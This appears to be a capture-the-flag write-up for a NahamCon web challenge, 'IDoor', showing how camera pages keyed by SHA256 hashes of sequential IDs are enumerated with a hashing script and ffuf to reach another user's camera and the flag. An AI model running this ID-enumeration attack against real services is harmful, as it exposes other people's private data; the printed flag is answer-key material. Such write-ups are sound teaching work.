
# Challenge Name: IDoor


![date](https://img.shields.io/badge/date-23.05.2024-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-50-blue.svg)  

## Description

Author: @JohnHammond#6971  
  
It's Apple's latest innovation, the "iDoor!" ... well, it is basically the Ring Doorbell camera, but the iDoor offers a web-based browser to monitor your camera, and super secure using ultimate cryptography with even SHA256 hashing algorithms to protect customers! Don't even _think_ about snooping on other people's cameras!!  
  
## Detailed solution

Start by checking the challenge URL, we got a redirection to `/4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8`
http://challenge.nahamcon.com:31646/4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8

![Pasted image 20240525182729](https://github.com/BaadMaro/CTF/assets/72421091/3e7c4708-bbb2-4e08-97cd-f0712f2e4bb4)

As we can see, we have the ID 11 and the URL identifier `4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8` which is the SHA256 value of 11.

We can generate SHA256 hashes with numbers to find different cameras IDs.

```bash
#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <input_string>"
  exit 1
fi

python3 -c "
import hashlib
input_string = \"$1\"
sha256_hash = hashlib.sha256(input_string.encode()).hexdigest()
print(sha256_hash)
"
```

```shell
for i in in {0..20}; do bash sha256_bash_python.sh $i; done | ffuf -c -w - -u http://challenge.nahamcon.com:31646/FUZZ          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://challenge.nahamcon.com:31646/FUZZ
 :: Wordlist         : FUZZ: -
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 [Status: 200, Size: 1797, Words: 634, Lines: 54, Duration: 160ms]
19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7 [Status: 200, Size: 1745, Words: 584, Lines: 52, Duration: 164ms]
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b [Status: 200, Size: 1766, Words: 584, Lines: 52, Duration: 172ms]
4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a [Status: 200, Size: 1781, Words: 584, Lines: 52, Duration: 171ms]
7902699be42c8a8e46fbbb4501726517e86b22c56a189f7625a6da49081b2451 [Status: 200, Size: 1795, Words: 584, Lines: 52, Duration: 167ms]
4a44dc15364204a80fe80e9039455cc1608281820fe2b24f1e5233ade6af1dd5 [Status: 200, Size: 1781, Words: 584, Lines: 52, Duration: 183ms]
ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d [Status: 200, Size: 1781, Words: 584, Lines: 52, Duration: 184ms]
2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3 [Status: 200, Size: 1766, Words: 584, Lines: 52, Duration: 194ms]
4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8 [Status: 200, Size: 3286, Words: 1040, Lines: 73, Duration: 185ms]
4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce [Status: 200, Size: 1780, Words: 584, Lines: 52, Duration: 769ms]
e7f6c011776e8db7cd330b54174fd76f7d0216b612387a5ffcfb81e6f0919683 [Status: 200, Size: 1798, Words: 584, Lines: 52, Duration: 756ms]
d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35 [Status: 200, Size: 1745, Words: 584, Lines: 52, Duration: 848ms]
:: Progress: [22/22] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

We got a hit with the value `5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9` which is 0

Now let's visit http://challenge.nahamcon.com:31646/5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9

![Pasted image 20240525183537](https://github.com/BaadMaro/CTF/assets/72421091/0a2021eb-6a02-4dce-8820-6ee0b7014b21)

We got our flag

## Flag

```
flag{770a058a80a9bca0a87c3e2ebe1ee9b2}
```
